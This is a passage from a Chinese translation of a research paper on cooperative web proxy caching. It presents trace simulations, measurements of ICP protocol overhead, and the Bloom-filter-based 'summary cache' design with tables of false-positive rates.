Web代理服务器跟踪，为大约<code>17,000个工作站</code>提供服务。跟踪持续25天（1996年8月29日至9月21日）。我们将跟踪分为三个1周和1个半周的跟踪。由于交换空间的限制，我们的模拟器只能模拟子迹线。在本文中，我们介绍了<code>1996年8月29日</code>至<code>9月4日</code>这一周的迹线结果。其他迹线的结果非常相似。</p></li><li><p><strong>UCB</strong>跟踪[24]：从UC Berkeley向其学生，教职员工提供的家庭IP服务收集的HTTP请求的跟踪。从1996年11月1日到11月19日，总迹线为期18天，并分为四个子迹线，每四或五天一次。我们在11月14日至11月19日的跟踪中显示结果。尽管该跟踪最初记录了2,468,890个请求，但其中许多响应数据大小为0或1，因此我们决定忽略这些请求。同样，我们在UCB集合中的其他迹线上进行了仿真，结果与此处介绍的相似。</p></li><li><p><strong>UPisa</strong>跟踪[43]：意大利比萨大学计算机科学系的用户在1997年1月至3月的三个月内对HTTP请求的跟踪。在跟踪中，我们仅模拟GET请求，并且仅网址不包含查询字符串的用户，因为大多数代理不缓存查询请求。</p></li><li><p><strong>Questnet</strong>追踪[47]：1998年1月15日至1月21日，父级代理在Questnet（澳大利亚的区域网络）中看到的HTTP请求日志为7天，这些代理服务于大约12个父级代理区域网络中的子代理。我们提取父代理看到的成功GET请求。因此，跟踪只是进入十个代理的用户请求的子集。不幸的是，用户对代理的完整请求集不可用。</p></li><li><p><strong>NLANR</strong>跟踪 [40]：由NLANR（应用网络研究国家实验室）向国家高速缓存层次结构中的四个主要父代理高速缓存发送HTTP请求的一日日志（1997年12月22日）。国家缓存层次结构中大约有八个代理，但是只有四个代理（“ bo”，“ pb”，“ sd”和“ uc”）处理来自.com，.net，.edu和其他主要领域。因此，我们决定仅模拟对四个代理的请求。</p></li></ul><p>在我们的缓存共享模拟中，我们将<code>DEC</code>，<code>UCB</code>和<code>UPisa</code>中的客户端分为几组，假设每个组都有自己的代理，并模拟代理之间的缓存共享。这大致对应于以下情况：</p><p>公司的每个分支机构或大学中的每个部门都有自己的代理缓存，并且这些缓存协作。我们将DEC，UCB和UPisa迹线中的组数分别设置为<code>16</code>、<code>8</code>和<code>8</code>。如果客户端的clientID与组大小相等，则将其放入组中。尽管该模拟并不完全符合实际情况，但我们相信它确实带来了有关缓存共享协议的见识。Questnet跟踪包含从区域网络中的一组子代理到父代理的HTTP请求。我们假设这些是进入子代理的请求（因为子代理将其缓存未命中发送给父代理），并且模拟了子代理之间的缓存共享。最后，NLANR跟踪包含去往四个主要代理的实际HTTP请求，我们模拟了它们之间的缓存共享。</p><p>在所有模拟中，我们将LRU用作缓存替换算法，但要注意的是，不能缓存大于250KB的文档。该策略类似于实际代理中使用的策略。我们不会根据年龄或生存时间来模拟到期的文档。而是，我们的大多数跟踪记录都包含每个请求的文档的上次修改时间，如果用户请求命中了上次修改时间已更改的文档，我们会将其视为缓存未命中。换句话说，我们假设缓存一致性机制是完美的。在实践中，有各种协议[12]，[34]，[28]为Web缓存的一致性。</p><p>我们的大多数模拟都假设缓存大小是”无限’’缓存大小的10％。研究表明，该”无限”的缓存大小的10％通常实现关于最大缓存命中率[90％ [49]，[8]，[35] ]。我们还执行了高速缓存大小为无限高速缓存大小5％的仿真，结果非常相似。</p><h2 id="缓存共享的好处"><a href="#缓存共享的好处" class="headerlink" title="缓存共享的好处"></a>缓存共享的好处</h2><p>最近的研究 [8],[23],[14]表明，在无限的缓存容量下，Web缓存命中率似乎与缓存所服务的用户数量成对数增长。 显然，来自不同用户的请求重叠减少了冷数据的miss，这通常是高速缓存未命中的重要部分，因为首次引用文档和文档修改都会对它们造成影响。</p><p><img src="/assets/images/summary-cache-figure-1.png" alt="图1：不同协作缓存方案下的缓存命中率（与字节命中率的结果相似，请注意，x轴为对数刻度）" loading="lazy"></p><p>为了检查有限缓存大小下的缓存共享的好处，我们使用上一节中列出的跟踪信息模拟以下方案：</p><ul><li><strong>无缓存共享</strong>：代理通过不协作的方式来服务彼此的缓存未命中；</li><li><strong>简单的缓存共享</strong>：代理服务彼此的缓存未命中。代理从另一个代理中获取文档后，便会在本地缓存该文档。代理通过不协调的方式进行缓存替换。这是由ICP协议实现的共享；</li><li><strong>单副本缓存共享</strong>：代理服务彼此的缓存未命中，但是一个代理不缓存从另一个代理获取的文档。而是，另一个代理将文档标记为最近访问的文档，并增加了其缓存优先级。与<strong>简单的缓存共享</strong>相比，此方案消除了重复副本的存储并提高了可用缓存空间的利用率；</li><li><strong>全局缓存</strong>：代理共享缓存内容并协调替换，以便它们显示为一个统一的缓存，对用户而言具有全局LRU替换。这是协作缓存的完全协调形式。我们通过假设所有请求都转到一个缓存的大小来模拟该方案，该缓存的大小是所有代理缓存大小的总和；.</li></ul><p>为了回答两个问题，我们研究了这些方案：简单的缓存共享是否会显著减少Web服务器的流量，更紧密的协调方案是否会导致命中率显著提高。</p><p><strong>图1</strong> 显示了当每个跟踪的缓存大小分别设置为”无限缓存大小’’（完全避免替换所需的最小高速缓存大小）大小的 <code>0.5％</code>，<code>5％</code>，<code>10％</code> 和 <code>20％</code> 时考虑的不同方案下的命中率。字节命中率的结果非常相似，由于空间限制，我们将其省略。</p><p>通过查看 <strong>图1</strong>，我们了解到，首先所有缓存共享方案比没有缓存共享显著提高了命中率。结果充分证实了共享缓存的好处，即使使用了很小的缓存。</p><p>其次，<strong>单拷贝缓存共享</strong>和<strong>简单的缓存共享</strong>下的命中率通常与<strong>全局缓存</strong>下的命中率相同甚至更高。我们认为，原因是全局LRU有时表现不如逐组LRU。特别是，在<strong>全局缓存</strong>设置中，来自一个用户的快速连续请求突发可能会干扰许多用户的工作集。在<strong>单副本缓存共享</strong>或<strong>简单缓存共享</strong>中，每个缓存专用于特定的用户组，并且来自每个组的流量争夺单独的缓存空间。因此，缓存穿透只包含在特定组中。</p><p>第三，将<strong>单副本缓存共享</strong>与<strong>简单的缓存共享</strong>进行比较时，我们发现浪费空间仅会产生很小的影响。原因是有效缓存略小，命中率没有明显差异。为了证明这一点，我们还使用比原始缓存小 <code>10％</code> 的<strong>全局缓存</strong>运行模拟。从 <strong>图1</strong> 可以看出，差异很小。</p><p>因此，尽管它很简单，但 <code>ICP</code> 类型的<strong>简单的缓存共享</strong>却获得了更精细的协作缓存的大部分好处。** 简单的缓存共享**不会通过将内容从繁忙的缓存移动到较不繁忙的缓存来执行任何负载平衡，并且无法通过仅保留每个文档的一个副本来节省空间。 但是，如果正确地完成了每个代理的资源规划，则无需执行负载平衡并产生更紧密协调方案的开销。</p><p>最后，请注意该结果是根据第2节中所述的LRU替换算法获得的。不同的替换算法[8]可能给出不同的结果。 此外，单独的仿真已确认，在严重的负载不平衡的情况下，<strong>全局缓存</strong>将具有更好的缓存命中率，因此，重要的是分配每个代理的缓存大小，使其与用户群大小和预期使用成比例。</p><h2 id="ICP的开销"><a href="#ICP的开销" class="headerlink" title="ICP的开销"></a>ICP的开销</h2><p><strong>表2</strong>：在四个代理情况下的ICP开销。 SC-ICP协议在第6节中介绍，稍后将进行说明。 实验进行了3次，每次测量的方差在括号中列出。 开销信息的行列出了每次测量的无ICP百分比增加。 请注意，在合成实验中没有代理间缓存命中。</p><table><thead><tr><th>Exp 1</th><th>Hit Ratio</th><th>Client Latency</th><th>User CPU</th><th>System CPU</th><th>UDP Msgs</th><th>TCP Msgs</th><th>Total Packets</th></tr></thead><tbody><tr><td>no ICP</td><td>25%</td><td>2.75 (5%)</td><td>94.42 (5%)</td><td>133.65 (6%)</td><td>615 (28%)</td><td>334K (8%)</td><td>355K(7%)</td></tr><tr><td>ICP</td><td>25%</td><td>3.07 (0.7%)</td><td>116.87 (5%)</td><td>146.50 (5%)</td><td>54774 (0%)</td><td>328K (4%)</td><td>402K (3%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>12%</td><td>24%</td><td>10%</td><td>9000%</td><td>2%</td><td>13%</td></tr><tr><td>SC-ICP</td><td>25%</td><td>2.85 (1%)</td><td>95.07 (6%)</td><td>134.61 (6%)</td><td>1079 (0%)</td><td>330K (5%)</td><td>351K (5%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>4%</td><td>0.7%</td><td>0.7%</td><td>75%</td><td>-1%</td><td>-1%</td></tr><tr><td><strong>Exp 2</strong></td><td><strong>Hit Ratio</strong></td><td><strong>Client Latency</strong></td><td><strong>User CPU</strong></td><td><strong>System CPU</strong></td><td><strong>UDP Msgs</strong></td><td><strong>TCP Msgs</strong></td><td><strong>Total Packets</strong></td></tr><tr><td>no ICP</td><td>45%</td><td>2.21 (1%)</td><td>80.83 (2%)</td><td>111.10 (2%)</td><td>540 (3%)</td><td>272K (3%)</td><td>290K (3%)</td></tr><tr><td>ICP</td><td>45%</td><td>2.39 (1%)</td><td>97.36 (1%)</td><td>118.59 (1%)</td><td>39968 (0%)</td><td>257K (2%)</td><td>314K (1%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>8%</td><td>20%</td><td>7%</td><td>7300%</td><td>-1%</td><td>8%</td></tr><tr><td>SC-ICP</td><td>45%</td><td>2.25 (1%)</td><td>82.03 (3%)</td><td>111.87 (3%)</td><td>799 (5%)</td><td>269K (5%)</td><td>287K (5%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>2%</td><td>1%</td><td>1%</td><td>48%</td><td>-1%</td><td>-1%</td></tr></tbody></table><p>Internet缓存协议（ICP）[18]在鼓励世界各地的Web缓存共享实践方面非常成功。 它需要代理之间的松散协调，并且基于UDP构建以提高效率。 它是由Harvest研究小组[26]设计的，并得到了公共领域Squid [19]代理软件和当今一些商业产品的支持。 随着Squid代理在全球的部署，ICP被全球很多国家广泛使用，以减少跨大西洋和跨太平洋链接的流量。</p><p>尽管ICP取得了成功，但它并不是一个可扩展的协议。 问题在于ICP依赖查询来查找远程缓存命中。 每当一个代理遇到高速缓存未命中时，其他所有人都会收到查询消息并进行处理。 随着协作代理服务器数量的增加，开销很快就会让人望而却步。</p><p>为了衡量ICP的开销及其对代理性能的影响，我们使用了我们设计的代理基准进行了实验[1]。 （该基准已作为行业标准基准的候选者提交给SPEC，目前已在许多代理系统供应商中使用）。该基准测试由一系列客户端进程组成，这些客户端进程按照实际跟踪中观察到的模式（包含请求大小的分布和时间局限性）发出请求， 以及一组服务器的进程，这些服务器进程会延迟答复以模拟Internet中的延迟。</p><p>实验是在 <code>10</code> 个与 <code>100Mb/s</code> 以太网连接的 <code>Sun Sparc-20</code> 工作站上进行的。四个工作站充当四个代理系统，运行 <code>Squid 1.1.14</code> ，每个工作站具有75MB的缓存空间。缓存大小被人为的变小，因此在实验的短时间内就会发生缓存替换。另外四个工作站运行 <code>120</code> 个客户端进程，每个工作站上运行 <code>30</code> 个进程。每个工作站上的客户端进程都连接到代理之一。客户进程发出请求时没有思考时间，请求的文档大小遵循Pareto分布，其中  $ \alpha &#x3D; 1.1 $ 和 $k &#x3D; 3.0$  [9]。最后，两个工作站充当服务器，每个工作站监听 <code>15</code> 个不同的端口。Web服务器在处理HTTP请求时复制一个进程，该进程等待 <code>1秒钟</code>，然后发送答复以模拟网络延迟。</p><p>我们尝试使用两种不同的缓存命中率，分别为 <code>25％</code> 和 <code>45％</code>，因为ICP的开销随每个代理中的缓存未命中率而变化。在基准测试中，客户端按照[35,8]中观察到的时间局部性模式发出请求，并且可以调整请求流中的固有缓存命中率。在一个实验中，每个客户端进程发出 <code>200</code> 个请求，总共 <code>24000</code>个请求。</p><p>通过使用基准测试，我们比较了两种配置：<strong>无ICP（代理不协作）</strong> 和 <strong>ICP（代理通过ICP协作）</strong>。由于我们仅对负载开销感兴趣，因此客户端发出的请求不会重叠，并且代理之间没有远程缓存命中。对于ICP，这是最坏的情况，结果可以衡量协议的开销。我们在no-ICP和ICP实验中的随机数生成器中使用相同的种子，以确保可比较的结果，否则的话，繁重文档的大小分布和我们的低请求数会导致高方差。在不同种子环境下，无ICP和ICP之间的相对差异是相同的。 我们在这里提供一组实验的结果。</p><p>我们测量缓存中的命中率，客户端看到的平均延迟，Squid代理消耗的CPU时间（根据用户CPU时间和系统CPU时间以及网络流量）。我们使用netstat收集发送和接收的UDP数据报的数量，发送和接收的TCP数据包以及以太网接口处理的IP数据包的总数。第三个采集的信息大约是前两个采集信息的数字之和。 ICP查询和回复消息会产生UDP流量。 TCP通信包括代理与服务器之间以及代理与客户端之间的HTTP通信。 结果示于 <strong>表2</strong>。</p><p>结果表明，即使协作代理的数量低至四个，ICP也会产生可观的开销。UDP消息的数量增加了大概 <code>73</code> 到 <code>90</code>。由于UDP消息的增加，代理看到的总网络流量增加了 <code>8％</code> 至 <code>13％</code>。协议处理将用户CPU时间增加 <code>20％</code> 至 <code>24％</code> ，而UDP消息处理将系统CPU时间增加 <code>7％</code> 至 <code>10％</code> 。反映给客户端，HTTP请求的平均延迟增加了 <code>8％</code> 至  <code>11％</code> 。尽管实验是在高速局域网上进行的，但仍会发生性能下降。</p><p>结果凸显了Web缓存管理员面临的困境。 缓存共享有明显的好处，但是ICP的开销很高。此外，大多数时候，由于没有缓存文档，因此浪费了查询消息的处理时间。从本质上讲，在处理ICP上花费的精力与其他代理所经历的缓存未命中总数成正比，而不是与实际的远程缓存命中数成正比。</p><p>为了解决该问题，我们提出了一种新的可伸缩缓存共享协议：摘要缓存。</p><h2 id="摘要缓存"><a href="#摘要缓存" class="headerlink" title="摘要缓存"></a>摘要缓存</h2><p>在摘要缓存方案中，每个代理在每个其他代理中存储其缓存文档目录的摘要。当用户请求未在本地缓存中丢失时，本地代理会检查存储的摘要，以查看请求的文档是否可能存储在其他代理中。如果出现这种情况，则代理会将请求发送到相关代理以获取文档。 否则，代理将请求直接发送到Web服务器。</p><p>该方案可扩展性的关键是摘要不必是最新的或准确的。每次更改缓存目录时都不必更新摘要。 相反，更新可以按固定的时间间隔进行，也可以在摘要中未反映一定百分比的缓存文档时进行。摘要只需要包含在内（即，描述存储在缓存中的文档的超集），以避免影响总缓存命中率。 也就是说，可以容忍两种错误：</p><ul><li><p><strong>假的未命中</strong>：所请求的文档被缓存在其他代理服务器上，但是其摘要未反映该事实。 在这种情况下，不利用远程高速缓存命中，并且降低了高速缓存集合中的总命中率。</p></li><li><p><strong>假的命中</strong>：所请求的文档未在其他代理处缓存，但其摘要表明已缓存。 代理将向另一个代理发送查询消息，仅通知该文件未缓存在该代理中。 在这种情况下，浪费了查询消息。</p></li></ul><p>该错误会影响总缓存命中率或代理间流量，但不会影响缓存方案的正确性。例如，错误的命中不会导致送达错误的文档。 通常，我们会努力降低误报率，因为误报会增加Internet的流量，而缓存共享的目标是减少到Internet的流量。</p><p>摘要缓存和ICP中都会发生第三种错误，即远程过时命中。远程过时命中是指文档在另一个代理处缓存，但是缓存的副本是过时的。远程过时命中并不一定是浪费精力，因为可以使用增量压缩来传输新文档[39]。 但是，它确实有助于代理间的通信。</p><p>有两个因素限制了摘要缓存的可伸缩性：网络开销（代理间通信）和存储摘要所需的内存（出于性能原因，摘要应存储在DRAM中，而不是磁盘上）。网络开销取决于摘要更新的频率以及错误匹配和远程匹配的数量。内存需求取决于各个摘要的大小和协作代理的数量。由于内存随代理的数量线性增长，因此保持单个摘要较小很重要。下面，我们首先介绍更新频率，然后讨论各种摘要表示。</p><h3 id="更新延迟的影响"><a href="#更新延迟的影响" class="headerlink" title="更新延迟的影响"></a>更新延迟的影响</h3><p><img src="/assets/images/summary-cache-figure-2.png" alt="图2：摘要更新延迟对总缓存命中率的影响（ 缓存大小是&quot;无限&#39;&#39;缓存大小的10％）" loading="lazy"></p><p>我们调查延迟摘要的更新，直到 “新”（即未反映在摘要中）缓存文档的百分比达到阈值为止。选择阈值标准是因为错误遗漏的数量（以及总命中率的下降）往往与未反映在摘要中的文档数量成正比。另一种方法是按固定的时间间隔更新摘要。可以通过将间隔转换为阈值来得出这种方法下的误漏率。也就是说，根据请求率和典型的高速缓存未命中率，可以计算出每个时间间隔内有多少新文档进入高速缓存及其在高速缓存文档中的百分比。</p><p>使用跟踪，我们可以模拟阈值分别为已缓存文档的 <code>0.1％</code>，<code>1％</code>，<code>2％</code>，<code>5％</code> 和 <code>10％</code>时总缓存命中率。目前，我们忽略摘要表示的问题，并假设摘要是缓存目录（即文档URL列表）的副本。结果如 <strong>图2</strong> 所示。图中第一行是未引入更新延迟时的命中率。第二行显示了命中率随着更新延迟的增加。这两行之间的差异是误漏率。底部的两条曲线显示了远程过时命中的比率和错误命中的比率（延迟的确引入了一些错误命中，因为从缓存中删除的文档可能仍存在于摘要中）。</p><p>结果表明，除了NLANR的跟踪数据外，总缓存命中率的下降几乎随更新阈值线性增长。在 <code>1％</code> 的阈值下，命中率相对降低为 <code>0.2％（UCB）</code>，<code>0.1％（UPisa）</code>，<code>0.3％（Questnet）</code> 和 <code>1.7％（DEC）</code>。 远程陈旧命中率几乎不受更新延迟的影响。虚假命中率非常小，因为摘要是缓存目录的精确副本，尽管它确实随阈值线性增加。</p><p>对于 <strong>NLANR跟踪</strong>，似乎某些客户端正在同时将两个完全相同的文档请求发送到代理”bo”和NLANR集合中的另一个代理。如果仅在NLANR中模拟其他三个代理，则结果与其他跟踪的结果类似。在包含”bo’’的情况下，我们还模拟了 <code>2个用户请求</code> 和 <code>10个用户请求</code> 的延迟，命中率分别从 <code>30.7％</code> 降至 <code>26.1％</code> 和 <code>20.2％</code> 。在 <code>0.1％</code> 的阈值处的命中率大约为 <code>18.4％</code>，大约等于200个用户请求。因此，我们认为命中率的急剧下降是由于NLANR迹线中的异常引起的。不幸的是，我们无法确定有问题的客户端，因为跨NLANR跟踪的客户端ID不一致[40]。</p><p>结果表明，实际上，摘要更新延迟阈值为  <code>1％</code> 到 <code>10％</code> 时会导致高速缓存命中率的可容忍度降低。对于这五个跟踪，阈值在两次更新之间转换成大约 <code>300</code> 到 <code>3000</code> 个用户请求，平均而言，大约 <strong>每5分钟到一个小时更新一次</strong>。因此，这些更新的带宽消耗可能非常低。</p><h3 id="摘要表示"><a href="#摘要表示" class="headerlink" title="摘要表示"></a>摘要表示</h3><p>影响可伸缩性的第二个问题是摘要的大小。摘要信息需要存储在主内存中，不仅因为内存查找要快得多，而且因为磁盘臂通常是代理缓存中的瓶颈[36]。尽管DRAM价格继续下降，但由于内存需求随代理数量线性增长，因此我们仍需要仔细设计。摘要信息还会使DRAM脱离热文档的内存高速缓存，从而影响代理性能。因此，重要的是要使摘要变小。幸运的是，摘要只需包含所有内容（即，描述存储在缓存中的文档的超集），即可避免影响缓存命中率。</p><p>我们首先研究两个简单的摘要表示形式：确切目录和服务器名称。在精确目录方法中，摘要基本上是缓存目录，每个URL均由其<strong>16字节MD5签名</strong>表示[38,22]。在服务器名称方法中，摘要是缓存中URL的服务器名称部分的列表。平均来看，不同URL与不同服务器名称的比率约为 <strong>10：1</strong>（从我们的跟踪记录中可以看到），因此服务器名称方法可以将内存减少10倍。</p><p>我们使用跟踪来模拟这些方法，发现它们都不令人满意。结果在图7中，以及在另一个摘要表示中的结果（在5.2节中详细讨论了图7）。精确目录方法消耗太多内存。实际上，代理通常具有<strong>8GB</strong>至<strong>20GB</strong>的缓存空间。如果我们假设<strong>16</strong>个代理服务器每个<strong>8GB</strong>，平均文件大小为<strong>8KB</strong>，则精确目录摘要将消耗**（16 -1）* 16 <em>（8GB &#x2F; 8KB）&#x3D;每个代理240MB主内存</em>*。服务器名称方法虽然消耗较少的内存，但会产生过多的错误命中，从而大大增加了网络消息。</p><p>理想的摘要表示形式的要求是小尺寸和低假命中率。 经过几次其他尝试，我们找到了一种称为布隆过滤器的古老技术的解决方案。</p><h3 id="布隆过滤器-数学"><a href="#布隆过滤器-数学" class="headerlink" title="布隆过滤器-数学"></a>布隆过滤器-数学</h3><p>布隆过滤器是一种可以用来在 <code>$n$</code> 个元素（也被叫做Keys）的集合  <code>$A = \&#123;&#123;a_1,a_2,...,a_n&#125;\&#125;$</code> 中查询成员的方法。</p><p>它由<code>Burton Bloom</code>在1970年发明，并被<code>Marais</code>和<code>Bharat</code>提出在Web的上下文中使用，作为一种机制用来识别哪些页面已经被存储在 CommonKnowledge 服务器中。</p><p><img src="/assets/images/summary-cache-figure-3.png" alt="图3：具有4个哈希函数的Bloom过滤器" loading="lazy"></p><p>这个想法（如图3所示）就是分配一个拥有 $m$ 个比特位的向量 $v$，最初全部设置为0，然后选择 $k$ 个独立的哈希函数，$h_1,h_2,…,h_k$，每一个的范围都是 ${1,…,m}$，对于每个元素  $a \in A$ ，$v$ 中处于位置 $h_1(a),h_2(a),….,h_k(a)$ 的位置都设置为 $1$ （一个特定的位置可能会被多次设置为 $1$）。当查询 $b$ 的时候，我们会检查 $h_1(b),h_2(b),…,h_k(b)$ 位置上的比特值。如果他们中的任何一个值为 $0$ ， $b$ 就肯定不在集合 $A$ 中。</p><p>尽管存在一定的可能性我们会判断错误，$b$ 本身不在集合中，但我们推测 $b$ 在集合中，这就被称为误报。 这种情况在历史上也叫做 “假阴性”。我们应该通过参数 $k$ 和 $m$ ，以使误报率（因此导致错误命中的概率）处在可接受的范围之内 。</p><p>布隆过滤器的显著特征是：在 $m$ 与误报的概率之间存在明显的折衷。通过观察发现在将 $n$ 个key插入到大小为 $m$ 的表中之后，某一个比特位仍然为 $0$ 的概率正好是：$(1-\displaystyle \frac{1}{m})^{kn}$</p><p>因此，在这种情况下误报的概率为：$(1-(1-\displaystyle \frac{1}{m})^{kn})^k \approx (1 - e^{-\frac{kn}{m}})^k$</p><p>在右面的值最小的情况下，$k$ 的值为：$k&#x3D;ln2 * \displaystyle \frac{m}{n}$ ，在这种情况下：$(\displaystyle \frac{1}{2})^k &#x3D; (0.6185)^\frac{m}{n}$</p><p>由于 $k$ 必须是整数，并且实际上我们可以选择一个小于最佳值的值以减少计算开销。 一些示例值是：</p><p><strong>表3</strong> 到 <strong>表5</strong> 列出了  $\displaystyle \frac{m}{n}$ 和  $k$ 的常见组合的误报率情况。</p><p><strong>表3：</strong> 在各种 m&#x2F;n 和 $k$ 组合下的误判率。</p><table><thead><tr><th align="center">m&#x2F;n</th><th align="center">k</th><th align="center">k&#x3D;1</th><th align="center">k&#x3D;2</th><th align="center">k&#x3D;3</th><th align="center">k&#x3D;4</th><th align="center">k&#x3D;5</th><th align="center">k&#x3D;6</th><th align="center">k&#x3D;7</th><th align="center">k&#x3D;8</th></tr></thead><tbody><tr><td align="center">2</td><td align="center">1.39</td><td align="center">0.393</td><td align="center">0.400</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">2.08</td><td align="center">0.283</td><td align="center">0.237</td><td align="center">0.253</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">2.77</td><td align="center">0.221</td><td align="center">0.155</td><td align="center">0.147</td><td align="center">0.160</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">5</td><td align="center">3.46</td><td align="center">0.181</td><td align="center">0.109</td><td align="center">0.092</td><td align="center">0.092</td><td align="center">0.101</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">6</td><td align="center">4.16</td><td align="center">0.154</td><td align="center">0.0804</td><td align="center">0.0609</td><td align="center">0.0561</td><td align="center">0.0578</td><td align="center">0.0638</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">7</td><td align="center">4.85</td><td align="center">0.133</td><td align="center">0.0618</td><td align="center">0.0423</td><td align="center">0.0359</td><td align="center">0.0347</td><td align="center">0.0364</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">8</td><td align="center">5.55</td><td align="center">0.118</td><td align="center">0.0489</td><td align="center">0.0306</td><td align="center">0.024</td><td align="center">0.0217</td><td align="center">0.0216</td><td align="center">0.0229</td><td align="center"></td></tr><tr><td align="center">9</td><td align="center">6.24</td><td align="center">0.105</td><td align="center">0.0397</td><td align="center">0.0228</td><td align="center">0.0166</td><td align="center">0.0141</td><td align="center">0.0133</td><td align="center">0.0135</td><td align="center">0.0145</td></tr><tr><td align="center">10</td><td align="center">6.93</td><td align="center">0.0952</td><td align="center">0.0329</td><td align="center">0.0174</td><td align="center">0.0118</td><td align="center">0.00943</td><td align="center">0.00844</td><td align="center">0.00819</td><td align="center">0.00846</td></tr><tr><td align="center">11</td><td align="center">7.62</td><td align="center">0.0869</td><td align="center">0.0276</td><td align="center">0.0136</td><td align="center">0.00864</td><td align="center">0.0065</td><td align="center">0.00552</td><td align="center">0.00513</td><td align="center">0.00509</td></tr><tr><td align="center">12</td><td align="center">8.32</td><td align="center">0.08</td><td align="center">0.0236</td><td align="center">0.0108</td><td align="center">0.00646</td><td align="center">0.00459</td><td align="center">0.00371</td><td align="center">0.00329</td><td align="center">0.00314</td></tr><tr><td align="center">13</td><td align="center">9.01</td><td align="center">0.074</td><td align="center">0.0203</td><td align="center">0.00875</td><td align="center">0.00492</td><td align="center">0.00332</td><td align="center">0.00255</td><td align="center">0.00217</td><td align="center">0.00199</td></tr><tr><td align="center">14</td><td align="center">9.7</td><td align="center">0.0689</td><td align="center">0.0177</td><td align="center">0.00718</td><td align="center">0.00381</td><td align="center">0.00244</td><td align="center">0.00179</td><td align="center">0.00146</td><td align="center">0.00129</td></tr><tr><td align="center">15</td><td align="center">10.4</td><td align="center">0.0645</td><td align="center">0.0156</td><td align="center">0.00596</td><td align="center">0.003</td><td align="center">0.00183</td><td align="center">0.00128</td><td align="center">0.001</td><td align="center">0.000852</td></tr><tr><td align="center">16</td><td align="center">11.1</td><td align="center">0.0606</td><td align="center">0.0138</td><td align="center">0.005</td><td align="center">0.00239</td><td align="center">0.00139</td><td align="center">0.000935</td><td align="center">0.000702</td><td align="center">0.000574</td></tr><tr><td align="center">17</td><td align="center">11.8</td><td align="center">0.0571</td><td align="center">0.0123</td><td align="center">0.00423</td><td align="center">0.00193</td><td align="center">0.00107</td><td align="center">0.000692</td><td align="center">0.000499</td><td align="center">0.000394</td></tr><tr><td align="center">18</td><td align="center">12.5</td><td align="center">0.054</td><td align="center">0.0111</td><td align="center">0.00362</td><td align="center">0.00158</td><td align="center">0.000839</td><td align="center">0.000519</td><td align="center">0.00036</td><td align="center">0.000275</td></tr><tr><td align="center">19</td><td align="center">13.2</td><td align="center">0.0513</td><td align="center">0.00998</td><td align="center">0.00312</td><td align="center">0.0013</td><td align="center">0.000663</td><td align="center">0.000394</td><td align="center">0.000264</td><td align="center">0.000194</td></tr><tr><td align="center">20</td><td align="center">13.9</td><td align="center">0.0488</td><td align="center">0.00906</td><td align="center">0.0027</td><td align="center">0.00108</td><td align="center">0.00053</td><td align="center">0.000303</td><td align="center">0.000196</td><td align="center">0.00014</td></tr><tr><td align="center">21</td><td align="center">14.6</td><td align="center">0.0465</td><td align="center">0.00825</td><td align="center">0.00236</td><td align="center">0.000905</td><td align="center">0.000427</td><td align="center">0.000236</td><td align="center">0.000147</td><td align="center">0.000101</td></tr><tr><td align="center">22</td><td align="center">15.2</td><td align="center">0.0444</td><td align="center">0.00755</td><td align="center">0.00207</td><td align="center">0.000764</td><td align="center">0.000347</td><td align="center">0.000185</td><td align="center">0.000112</td><td align="center">7.46e-05</td></tr><tr><td align="center">23</td><td align="center">15.9</td><td align="center">0.0425</td><td align="center">0.00694</td><td align="center">0.00183</td><td align="center">0.000649</td><td align="center">0.000285</td><td align="center">0.000147</td><td align="center">8.56e-05</td><td align="center">5.55e-05</td></tr><tr><td align="center">24</td><td align="center">16.6</td><td align="center">0.0408</td><td align="center">0.00639</td><td align="center">0.00162</td><td align="center">0.000555</td><td align="center">0.000235</td><td align="center">0.000117</td><td align="center">6.63e-05</td><td align="center">4.17e-05</td></tr><tr><td align="center">25</td><td align="center">17.3</td><td align="center">0.0392</td><td align="center">0.00591</td><td align="center">0.00145</td><td align="center">0.000478</td><td align="center">0.000196</td><td align="center">9.44e-05</td><td align="center">5.18e-05</td><td align="center">3.16e-05</td></tr><tr><td align="center">26</td><td align="center">18</td><td align="center">0.0377</td><td align="center">0.00548</td><td align="center">0.00129</td><td align="center">0.000413</td><td align="center">0.000164</td><td align="center">7.66e-05</td><td align="center">4.08e-05</td><td align="center">2.42e-05</td></tr><tr><td align="center">27</td><td align="center">18.7</td><td align="center">0.0364</td><td align="center">0.0051</td><td align="center">0.00116</td><td align="center">0.000359</td><td align="center">0.000138</td><td align="center">6.26e-05</td><td align="center">3.24e-05</td><td align="center">1.87e-05</td></tr><tr><td align="center">28</td><td align="center">19.4</td><td align="center">0.0351</td><td align="center">0.00475</td><td align="center">0.00105</td><td align="center">0.000314</td><td align="center">0.000117</td><td align="center">5.15e-05</td><td align="center">2.59e-05</td><td align="center">1.46e-05</td></tr><tr><td align="center">29</td><td align="center">20.1</td><td align="center">0.0339</td><td align="center">0.00444</td><td align="center">0.000949</td><td align="center">0.000276</td><td align="center">9.96e-05</td><td align="center">4.26e-05</td><td align="center">2.09e-05</td><td align="center">1.14e-05</td></tr><tr><td align="center">30</td><td align="center">20.8</td><td align="center">0.0328</td><td align="center">0.00416</td><td align="center">0.000862</td><td align="center">0.000243</td><td align="center">8.53e-05</td><td align="center">3.55e-05</td><td align="center">1.69e-05</td><td align="center">9.01e-06</td></tr><tr><td align="center">31</td><td align="center">21.5</td><td align="center">0.0317</td><td align="center">0.0039</td><td align="center">0.000785</td><td align="center">0.000215</td><td align="center">7.33e-05</td><td align="center">2.97e-05</td><td align="center">1.38e-05</td><td align="center">7.16e-06</td></tr><tr><td align="center">32</td><td align="center">22.2</td><td align="center">0.0308</td><td align="center">0.00367</td><td align="center">0.000717</td><td align="center">0.000191</td><td align="center">6.33e-05</td><td align="center">2.5e-05</td><td align="center">1.13e-05</td><td align="center">5.73e-06</td></tr></tbody></table><p><strong>表4：</strong> 在各种 $m&#x2F;n$ 和 $k$ 